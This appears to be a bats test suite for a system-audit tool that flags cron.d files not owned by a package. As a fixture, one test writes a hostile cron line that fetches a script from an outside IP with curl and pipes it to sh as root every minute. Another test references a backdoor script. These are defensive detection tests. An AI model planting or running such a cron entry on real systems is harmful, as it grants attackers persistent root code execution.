#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; }

@test "hand-dropped cron.d entry is attention; loud when it fetch-execs" {
  _PM=rpm
  pkg_owns() { return 1; }   # not package-owned
  echo '* * * * * root curl http://5.9.1.2/x | sh' > "$ROOT/etc/cron.d/evil"
  check_scheduled
  emitted attention "evil"
  emitted attention "fetch-exec"
}

@test "package-owned cron file is normal" {
  _PM=rpm
  pkg_owns() { return 0; }   # owned
  echo '0 3 * * * root /usr/bin/logrotate' > "$ROOT/etc/cron.d/logrotate"
  check_scheduled
  emitted normal "logrotate"
}

@test "unreadable cron file emits a blindspot, not a silent skip" {
  [ "$(id -u)" -eq 0 ] && skip "must run as non-root to make the file unreadable"
  echo '* * * * * root /usr/bin/foo' > "$ROOT/etc/cron.d/locked"
  chmod 000 "$ROOT/etc/cron.d/locked"
  reset_state
  check_scheduled
  [[ " ${_BLINDSPOTS[*]:-} " == *"cron.d/locked"* ]]
}

@test "hand-dropped non-fetch-exec cron file is attention" {
  _PM=rpm
  pkg_owns() { return 1; }
  echo '0 4 * * * root /opt/backdoor.sh' > "$ROOT/etc/cron.d/suspicious"
  reset_state
  check_scheduled
  emitted attention "suspicious"
  ! emitted normal "suspicious"
}

@test "clean root produces no scheduled attention items" {
  reset_state
  check_scheduled
  [ "$_N_ATTENTION" -eq 0 ]
}
